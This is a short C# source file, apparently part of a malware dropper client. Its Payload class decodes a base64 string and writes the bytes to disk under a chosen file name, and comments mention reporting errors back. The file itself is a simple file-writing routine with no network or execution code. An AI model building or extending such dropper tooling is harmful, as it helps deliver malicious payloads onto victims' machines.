using System;
using System.IO;

namespace DropperClient.Command
{
    internal class Payload
    {
        private byte[] PayloadBytes { get; set; }

        private string FileName { get; set; }

        public string Drop()
        {
            try
            {
                File.WriteAllBytes("./" + FileName, PayloadBytes);
            }
            catch (IOException ioex)
            {
                // Handle error, prolly send errormessages back
                return null;
            }
            catch (Exception ex)
            {
                // Handle error, prolly send errormessages back
                return null;
            }

            if (File.Exists("./" + FileName))
            {
                var f = new FileInfo(FileName);
                return f.FullName;
            }
            else
            {
                return null;
            }
        }

        public bool SetPayload(string base64string)
        {
            try
            {
                PayloadBytes = Convert.FromBase64String(base64string);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public void SetFileName(string name)
        {
            FileName = name;
        }
    }
}